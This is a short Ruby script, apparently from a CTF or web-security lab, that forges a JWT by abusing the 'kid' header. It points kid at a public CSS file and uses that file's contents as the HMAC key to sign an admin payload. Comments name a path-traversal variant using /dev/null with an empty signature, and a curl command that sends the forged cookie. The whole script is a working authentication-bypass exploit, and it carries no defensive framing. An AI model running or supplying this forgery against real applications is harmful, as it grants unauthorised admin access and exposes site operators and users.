require 'base64'
require 'openssl'

# The idea is that we can abuse kid to read files from the filesystem and sign
# tokens based on the content of these files.
# We can also use ../../../../../../../../../dev/null and an empty signature

header = '{"typ":"JWT", "alg":"HS256", "kid":"public/css/bootstrap.css"}'
payload = '{"user":"admin"}'

# We get this file with curl -O link_from_css_file
secret = File.read("bootstrap.css")

data = Base64.strict_encode64(header) + "." + Base64.strict_encode64(payload)
data = data.gsub("=", "")

signature = Base64.urlsafe_encode64(
  OpenSSL::HMAC.digest(
    OpenSSL::Digest.new('sha256'),
    secret,
    data
  )
)

# With this result we can : curl -H "cookie: auth=<value_we_get>" domain
puts [data, signature].join(".")
